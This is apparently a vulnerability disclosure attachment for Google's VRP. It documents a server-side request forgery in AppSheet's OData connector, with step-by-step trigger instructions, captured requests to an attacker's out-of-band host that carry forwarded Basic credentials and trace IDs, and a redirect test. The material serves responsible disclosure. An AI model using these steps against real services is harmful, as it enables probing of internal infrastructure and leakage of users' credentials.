# Attachment 1 — Surface 1: OData Connector HTTP SSRF
# AppSheet Systemic SSRF (F003) — Google VRP Submission
# Reporter: azmolhaque95@gmail.com | Date: 2026-06-19

---

## WHAT THIS PROVES

AppSheet's OData connector makes a live server-side HTTP request from a GCP-origin IP
to an attacker-controlled host, forwarding user-supplied credentials (Authorization: Basic)
and internal W3C Traceparent trace IDs verbatim.

---

## TRIGGER

1. Go to: https://appsheet.com/Account/ODataAuthInfo
2. OData Version: 4.0 (also reproduced on 3.0 and 2.0)
3. OData Service Root URL: https://<attacker-oob-host>
4. Username: canary
5. Password: canary
6. Click: Test

---

## HTTP REQUEST RECEIVED AT ATTACKER OOB LISTENER

### Session 3 — 2026-06-16 20:56:44 UTC (OData v3/v4 — Microsoft.OData.Client)

```
GET /$metadata HTTP/1.1
Host: d8orfta69r82mdenbp8gfswz8ppxcwd6z.oast.pro
Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
Accept-Encoding: gzip, deflate
Authorization: Basic Y2FuYXJ5OmNhbmFyeQ==
Traceparent: 00-0c8e50f9dbef2c8e1ed19c52570f68e0-5ca09006c9d17de0-00
```

- Source IP:  35.203.182.241  →  Google Cloud Platform (GCP), AS15169
- DNS resolvers: 172.217.46.252, .248, .254  →  Google, AS15169
- Authorization decoded:  Y2FuYXJ5OmNhbmFyeQ==  →  canary:canary  ✓ credentials forwarded
- Traceparent: internal distributed-trace ID leaked from AppSheet GCP backend

### Pre-submission reconfirm — 2026-06-19 10:59:45 UTC (OData v2 — Microsoft.Data.Services.Client)

```
GET /$metadata HTTP/1.1
Host: d8qhv9269r87j64tn7r0dxjbtfhfrhxcj.oast.pro
Accept-Encoding: gzip, deflate
Authorization: Basic VGVzdGVyOlRlc3RlcjEyMzQ=
Traceparent: 00-769bd8f577803f62e9441a2a331ac571-5292dec86d0df123-00
```

- Source IPs: 35.185.223.113 (10:59:45) + 35.203.182.241 (10:59:54)  →  GCP, AS15169 (load-balanced)
- Authorization decoded:  VGVzdGVyOlRlc3RlcjEyMzQ=  →  Tester:Tester1234  ✓ credentials forwarded
- No OData Accept header  →  distinct .NET library: Microsoft.Data.Services.Client (v2 client)
- Two GCP fleet nodes hit simultaneously: confirms server-side execution, not client-side

---

## CONFIRMATION ACROSS 5 INDEPENDENT DATES

| Date | Source IP | Credentials | Notes |
|------|-----------|-------------|-------|
| 2026-06-15 20:03 UTC | 35.203.182.241 | testuser:testpass1234 | Initial discovery |
| 2026-06-16 11:43 UTC | 35.247.115.29  | —                    | Independent re-verification |
| 2026-06-16 20:56 UTC | 35.203.182.241 | canary:canary         | Session 3 |
| 2026-06-17 12:52 UTC | 34.82.138.241  | Tester:Tester         | Clean-session verify |
| 2026-06-19 10:58 UTC | 35.185.223.113 + 35.203.182.241 | Tester:Tester1234 | Pre-submission; v2+v3+v4 all confirmed |

All IPs confirmed GCP/AS15169 via whois.

---

## RESPONSE ORACLE

AppSheet's UI error message reflected the HTTP response Content-Type from the OOB server
back to the browser — confirming the backend fetches and partially processes server responses:

  AppSheet UI error: "OData web request error (Unsupported Media Type)"
  When OOB server returned: Content-Type: text/html; charset=utf-8

This is a semi-blind SSRF with a content-type oracle.

---

## REDIRECT TEST (HTTPS → HTTP blocked)

Tested 2026-06-19 with a live redirect server (302: https://<OOB> → http://<L2>):
- OData client returned: "OData web request error (Found)"
- L2 (HTTP) listener received: zero hits
- Result: cross-scheme redirect BLOCKED on this surface
- CVSS UI:N path is self-SSRF (attacker uses own OOB) — redirect block does not affect severity
